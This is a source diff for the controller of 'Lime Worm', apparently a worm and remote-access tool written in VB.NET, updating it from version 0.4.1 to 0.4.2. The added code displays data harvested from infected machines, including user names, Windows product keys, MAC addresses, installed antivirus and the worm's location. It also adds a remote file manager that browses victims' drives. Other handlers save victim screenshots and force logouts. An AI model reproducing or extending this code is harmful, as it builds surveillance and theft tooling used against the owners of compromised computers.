@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##        N Y A N   C A T  |||   Updated on MAR./18/2018        ##
+'##        N Y A N   C A T  |||   Updated on MAR./20/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -19,7 +19,7 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                     .. Lime Worm v0.4.1 ..                   ##
+'##                     .. Lime Worm v0.4.2 ..                   ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
@@ -68,7 +68,7 @@ Public Class Form1
             End
         End Try
 
-        Me.Text = "Lime Worm v0.4.1E"
+        Me.Text = "Lime Worm v0.4.2A"
 
         Try
             If Not IO.Directory.Exists(Application.StartupPath + "\" + "Wallpaper") Then
@@ -210,25 +210,37 @@ Public Class Form1
                         D.Show()
                     End If
 
-                    D.ListView1.Items.Clear()
+                    D.TreeView1.Nodes(0).Nodes(0).Text = "Computer Name: " & A(1)
+                    D.TreeView1.Nodes(0).Nodes(1).Text = "User Name: " & A(2)
+                    D.TreeView1.Nodes(0).Nodes(2).Text = "Virtual Screen Width: " & A(3)
+                    D.TreeView1.Nodes(0).Nodes(3).Text = "Virtual Screen Height: " & A(4)
+                    D.TreeView1.Nodes(0).Nodes(4).Text = "Available Physical Memory: " & A(5)
+                    D.TreeView1.Nodes(0).Nodes(5).Text = "Available Virtual Memory: " & A(6)
+                    D.TreeView1.Nodes(0).Nodes(6).Text = "OS Full Name: " & A(7)
+                    D.TreeView1.Nodes(0).Nodes(7).Text = "OS Platform: " & A(8)
+                    D.TreeView1.Nodes(0).Nodes(8).Text = "OS Version: " & A(9)
+                    D.TreeView1.Nodes(0).Nodes(9).Text = "Total Physical Memory: " & A(10)
+                    D.TreeView1.Nodes(0).Nodes(10).Text = "Total Virtual Memory: " & A(11)
+                    D.TreeView1.Nodes(0).Nodes(11).Text = "Battery Charge Status: " & A(12)
+                    D.TreeView1.Nodes(0).Nodes(12).Text = "Battery Full Lifetime: " & A(13)
+                    D.TreeView1.Nodes(0).Nodes(13).Text = "Battery Life Percent: " & A(14)
+                    D.TreeView1.Nodes(0).Nodes(14).Text = "Battery Life Remaining: " & A(15)
+                    D.TreeView1.Nodes(0).Nodes(15).Text = "CPU Info: " & A(16)
+                    D.TreeView1.Nodes(0).Nodes(16).Text = "GPU Name: " & A(17)
+                    D.TreeView1.Nodes(0).Nodes(17).Text = "Uptime: " & A(18)
+                    D.TreeView1.Nodes(1).Nodes(0).Text = "Registered Owner: " & A(19)
+                    D.TreeView1.Nodes(1).Nodes(1).Text = "Registered Organization: " & A(20)
+                    D.TreeView1.Nodes(1).Nodes(2).Text = "Product Key: " & A(21)
 
-                    D.ListView1.Columns.Add("")
-                    D.ListView1.Columns.Add("")
+                    Dim s As String = A(22)
+                    For i = 2 To s.Length + 2 Step 3
+                        s = s.Insert(i, ":")
+                    Next
 
-                    D.ListView1.Items.Add("ID ").SubItems.Add(A(1))
-                    D.ListView1.Items.Add("User ").SubItems.Add(A(2))
-                    D.ListView1.Items.Add("Windows Name ").SubItems.Add(A(12))
-                    D.ListView1.Items.Add("Windows Key ").SubItems.Add(A(13))
-                    D.ListView1.Items.Add("Connection ").SubItems.Add(A(11))
-                    D.ListView1.Items.Add("Stub ").SubItems.Add(A(3))
-                    D.ListView1.Items.Add("CPU ").SubItems.Add(A(4))
-                    D.ListView1.Items.Add("GPU ").SubItems.Add(A(5))
-                    D.ListView1.Items.Add("Privilege ").SubItems.Add(A(6))
-                    D.ListView1.Items.Add("Machine Type ").SubItems.Add(A(7))
-                    D.ListView1.Items.Add("Current Time ").SubItems.Add(A(8))
-                    D.ListView1.Items.Add("Drivers List ").SubItems.Add(A(9))
-                    D.ListView1.Items.Add("Last reboot ").SubItems.Add(A(10))
-                    D.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
+                    D.TreeView1.Nodes(1).Nodes(3).Text = "MAC Adress: " & s
+                    D.TreeView1.Nodes(1).Nodes(4).Text = "Installed AntiVirus Engine: " & A(23)
+                    D.TreeView1.Nodes(1).Nodes(5).Text = "Worm Location: " & A(24)
+
 
                 Case "MSG"
                     Messages("{" + u.IP.Split(":")(0) + "}", A(1).ToString)
@@ -245,6 +257,95 @@ Public Class Form1
 
                 Case "SC"
                     IO.File.WriteAllBytes("Users" + "\" + A(1).ToString + "\" + "SC.jpeg", Convert.FromBase64String(A(2)))
+
+                Case "OFM"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
+                        Exit Sub
+                    End If
+
+                    Dim FM As Filemanager = My.Application.OpenForms("FM" + u.IP)
+                    If FM Is Nothing Then
+                        FM = New Filemanager
+                        FM.F = Me
+                        FM.U = u
+                        FM.Name = "FM" + u.IP
+                        FM.Text = "FM " + u.IP.Split(":")(0)
+                        FM.Show()
+                    End If
+
+                Case "FM"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
+                        Exit Sub
+                    End If
+
+                    Dim FM As Filemanager = My.Application.OpenForms("FM" & u.IP)
+                    If A(1) = "Error" Then
+                        FM.BackToolStripMenuItem.PerformClick()
+                    Else
+                        FM.ListView1.Items.Clear()
+                        Dim allFiles As String() = Split(A(1), "|SPL_FM|")
+                        For i = 0 To allFiles.Length - 2
+                            Dim itm As New ListViewItem
+                            itm.Text = allFiles(i)
+                            itm.SubItems.Add(allFiles(i + 1))
+                            If Not itm.Text.StartsWith("[Drive]") And Not itm.Text.StartsWith("[CD]") And Not itm.Text.StartsWith("[Folder]") Then
+                                Dim fsize As Long = Convert.ToInt64(itm.SubItems(1).Text)
+                                If fsize > 1073741824 Then
+                                    Dim size As Double = fsize / 1073741824
+                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " GB"
+                                ElseIf fsize > 1048576 Then
+                                    Dim size As Double = fsize / 1048576
+                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " MB"
+                                ElseIf fsize > 1024 Then
+                                    Dim size As Double = fsize / 1024
+                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " KB"
+                                Else
+                                    itm.SubItems(1).Text = fsize.ToString & " B"
+                                End If
+                                itm.Tag = Convert.ToInt64(allFiles(i + 1))
+                            End If
+                            If itm.Text.StartsWith("[Drive]") Then
+                                itm.ImageIndex = 0
+                                itm.Text = itm.Text.Substring(7)
+                            ElseIf itm.Text.StartsWith("[CD]") Then
+                                itm.ImageIndex = 1
+                                itm.Text = itm.Text.Substring(4)
+                            ElseIf itm.Text.StartsWith("[Folder]") Then
+                                itm.ImageIndex = 2
+                                itm.Text = itm.Text.Substring(8)
+                            ElseIf itm.Text.EndsWith(".exe") Then
+                                itm.ImageIndex = 3
+                            ElseIf itm.Text.EndsWith(".jpg") Or itm.Text.EndsWith(".jpeg") Or itm.Text.EndsWith(".gif") Or itm.Text.EndsWith(".png") Or itm.Text.EndsWith(".bmp") Then
+                                itm.ImageIndex = 4
+                            ElseIf itm.Text.EndsWith(".doc") Or itm.Text.EndsWith(".rtf") Or itm.Text.EndsWith(".txt") Then
+                                itm.ImageIndex = 5
+                            ElseIf itm.Text.EndsWith(".dll") Then
+                                itm.ImageIndex = 6
+                            ElseIf itm.Text.EndsWith(".zip") Or itm.Text.EndsWith(".rar") Then
+                                itm.ImageIndex = 7
+                            ElseIf itm.Text.EndsWith(".wav") Then
+                                itm.ImageIndex = 9
+                            ElseIf itm.Text.EndsWith(".avi") Or itm.Text.EndsWith(".mb4") Or itm.Text.EndsWith(".flv") Or itm.Text.EndsWith(".3gp") Then
+                                itm.ImageIndex = 11
+                            ElseIf itm.Text.EndsWith(".mp3") Then
+                                itm.ImageIndex = 12
+                            ElseIf itm.Text.EndsWith(".html") Or itm.Text.EndsWith(".Php") Or itm.Text.EndsWith(".xml") Then
+                                itm.ImageIndex = 10
+                            ElseIf itm.Text.EndsWith(".rar") Then
+                                itm.ImageIndex = 13
+                            ElseIf itm.Text.EndsWith(".Lime") Then
+                                itm.ForeColor = Color.Lime
+                                itm.ImageIndex = 14
+                            Else
+                                itm.ImageIndex = 8
+                            End If
+                            FM.ListView1.Items.Add(itm)
+                            i += 1
+                        Next
+                    End If
+
             End Select
         Catch ex As Exception
             MsgBox(ex.Message)
@@ -569,6 +670,12 @@ Public Class Form1
     Private Sub PCLogoutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCLogoutToolStripMenuItem.Click
         For Each x As ListViewItem In L1.SelectedItems
             S.Send(x.Tag, "PC-OUT")
+        Next
+    End Sub
+
+    Private Sub CheckFilesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CheckFilesToolStripMenuItem.Click
+        For Each x As ListViewItem In L1.SelectedItems
+            S.Send(x.Tag, "OFM")
         Next
     End Sub
 
